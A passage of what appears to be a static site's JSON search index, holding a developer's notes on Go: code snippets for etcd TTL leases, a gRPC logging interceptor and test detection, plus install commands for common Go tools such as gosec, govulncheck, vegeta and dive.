Error\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"solve\"\u003esolve\u003c/h6\u003e\n\u003cp\u003e\u003ccode\u003e/etc/gitlab/gitlab.rb\u003c/code\u003e\u003c/p\u003e","tags":null,"title":"Gitlab docs"},{"categories":null,"contents":" ETCD TTL func main() { // 创建 etcd 客户端 cli, err := clientv3.New(clientv3.Config{ Endpoints: []string{\u0026#34;localhost:2379\u0026#34;}, DialTimeout: 5 * time.Second, }) if err != nil { fmt.Println(\u0026#34;Error connecting to etcd:\u0026#34;, err) return } defer cli.Close() // 设置 TTL (单位为秒) ttl := int64(10) // 例如 10 秒 resp, err := cli.Grant(context.TODO(), ttl) if err != nil { fmt.Println(\u0026#34;Error creating lease:\u0026#34;, err) return } // 使用 Lease ID 进行 Put 操作 _, err = cli.Put(context.TODO(), \u0026#34;my-key\u0026#34;, \u0026#34;my-value\u0026#34;, clientv3.WithLease(resp.ID)) if err != nil { fmt.Println(\u0026#34;Error putting key with lease:\u0026#34;, err) return } fmt.Println(\u0026#34;Key with TTL successfully set.\u0026#34;) } gRPC UnaryInterceptor func unaryInterceptor( ctx context.Context, req interface{}, info *googleGrpc.UnaryServerInfo, handler googleGrpc.UnaryHandler, ) (interface{}, error) { // 打印被调用的方法名 fmt.Println(\u0026#34;Called method:\u0026#34;, info.FullMethod) // 打印传入的请求参数 fmt.Printf(\u0026#34;Request: %+v\\n\u0026#34;, req) fmt.Printf(\u0026#34;Meta: %+v\\n\u0026#34;, util.GetReqInfoFromCtx(ctx)) // 调用实际的 handler response, err := handler(ctx, req) if err != nil { fmt.Println(\u0026#34;err: \u0026#34;, err) } return response, err } isRunningTest // isRunningTest 確認是否在跑測試 func isRunningTest() bool { return flag.Lookup(\u0026#34;test.v\u0026#34;) != nil } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/snippet/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eETCD TTL\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 创建 etcd 客户端\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eclientv3\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNew\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eclientv3\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eConfig\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eEndpoints\u003c/span\u003e:   []\u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e{\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;localhost:2379\u0026#34;\u003c/span\u003e},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003eDialTimeout\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t})\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Error connecting to etcd:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003edefer\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eClose\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 设置 TTL (单位为秒)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ettl\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e int64(\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e) \u003cspan style=\"color:#75715e\"\u003e// 例如 10 秒\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGrant\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTODO\u003c/span\u003e(), \u003cspan style=\"color:#a6e22e\"\u003ettl\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Error creating lease:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#75715e\"\u003e// 使用 Lease ID 进行 Put 操作\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ecli\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePut\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eTODO\u003c/span\u003e(), \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;my-key\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;my-value\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eclientv3\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eWithLease\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eresp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eID\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Error putting key with lease:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Key with TTL successfully set.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003egRPC UnaryInterceptor\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eunaryInterceptor\u003c/span\u003e(\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003econtext\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eContext\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{},\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003einfo\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003egoogleGrpc\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnaryServerInfo\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003ehandler\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003egoogleGrpc\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUnaryHandler\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e) (\u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}, \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 打印被调用的方法名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Called method:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003einfo\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFullMethod\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 打印传入的请求参数\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Request: %+v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Meta: %+v\\n\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eutil\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eGetReqInfoFromCtx\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e// 调用实际的 handler\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ehandler\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;err: \u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eresponse\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eisRunningTest\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// isRunningTest 確認是否在跑測試\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eisRunningTest\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003ebool\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eflag\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eLookup\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test.v\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Go Snippet"},{"categories":null,"contents":" tools benchstat go install golang.org/x/perf/cmd/benchstat@latest deadcode go install golang.org/x/tools/cmd/deadcode@latest httpstat It\u0026rsquo;s like curl -v, with colours. go get github.com/davecheney/httpstat jsonnet This an implementation of Jsonnet in pure Go go get github.com/google/go-jsonnet/cmd/jsonnet migrate go install -tags \u0026#39;mysql,sqlite,sqlite3\u0026#39; github.com/golang-migrate/migrate/v4/cmd/migrate@latest protobuf go install google.golang.org/protobuf/cmd/protoc-gen-go@lastest go install google.golang.org/grpc/cmd/protoc-gen-go-grpc@lastest go install github.com/google/gnostic/cmd/protoc-gen-openapi@latest gosec Golang security checker go get -u github.com/securego/gosec/cmd/gosec govulncheck go install golang.org/x/vuln/cmd/govulncheck@latest vegeta HTTP load testing tool and library go get -u github.com/tsenart/vegeta dasel Select, put and delete data from JSON, TOML, YAML, XML and CSV files with a single tool. Supports conversion between formats and can be used as a Go package. brew install dasel go install github.com/tomwright/dasel/v2/cmd/dasel@master hey HTTP load generator, ApacheBench (ab) replacement, formerly known as rakyll/boom brew install hey slides Terminal based presentation tool brew install slides go install github.com/maaslalani/slides@latest gokart A static analysis tool for securing Go code go install github.com/praetorian-inc/gokart@latest structslop structslop is a static analyzer for Go that recommends struct field rearrangements to provide for maximum space/allocation efficiency. go install -v github.com/orijtech/structslop/cmd/structslop@v0.0.8 go get github.com/orijtech/structslop/cmd/structslop dive A tool for exploring each layer in a docker image brew install dive go get github.com/wagoodman/dive sttr cross-platform, cli app to perform various operations on string go install github.com/abhimanyu003/sttr@latest gentool Gen Tool is a single binary without dependencies can be used to generate structs from database go install gorm.io/gen/tools/gentool@latest wire go install github.com/google/wire/cmd/wire@latest ko Build and deploy Go applications go install github.com/google/ko@latest Talisman A tool to detect and prevent secrets from getting checked in\nhttps://github.com/thoughtworks/talisman\nbrew install talisman\n","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/tools/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003etools\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"benchstat\"\u003ebenchstat\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install golang.org/x/perf/cmd/benchstat@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"deadcode\"\u003edeadcode\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install golang.org/x/tools/cmd/deadcode@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"httpstat\"\u003ehttpstat\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eIt\u0026rsquo;s like curl -v, with colours.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get github.com/davecheney/httpstat\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"jsonnet\"\u003ejsonnet\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eThis an implementation of Jsonnet in pure Go\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get github.com/google/go-jsonnet/cmd/jsonnet\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"migrate\"\u003emigrate\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install -tags \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;mysql,sqlite,sqlite3\u0026#39;\u003c/span\u003e github.com/golang-migrate/migrate/v4/cmd/migrate@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"protobuf\"\u003eprotobuf\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install google.golang.org/protobuf/cmd/protoc-gen-go@lastest\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install google.golang.org/grpc/cmd/protoc-gen-go-grpc@lastest\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/google/gnostic/cmd/protoc-gen-openapi@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"gosec\"\u003egosec\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eGolang security checker\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get -u github.com/securego/gosec/cmd/gosec\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"govulncheck\"\u003egovulncheck\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install golang.org/x/vuln/cmd/govulncheck@latest\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"vegeta\"\u003evegeta\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eHTTP load testing tool and library\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego get -u github.com/tsenart/vegeta\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"dasel\"\u003edasel\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eSelect, put and delete data from JSON, TOML, YAML, XML and CSV files with a single tool. Supports conversion between formats and can be used as a Go package.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebrew install dasel\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego install github.com/tomwright/dasel/v2/cmd/dasel@master\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"hey\"\u003ehey\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003eHTTP load generator, ApacheBench (ab) replacement, formerly known as rakyll/boom\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 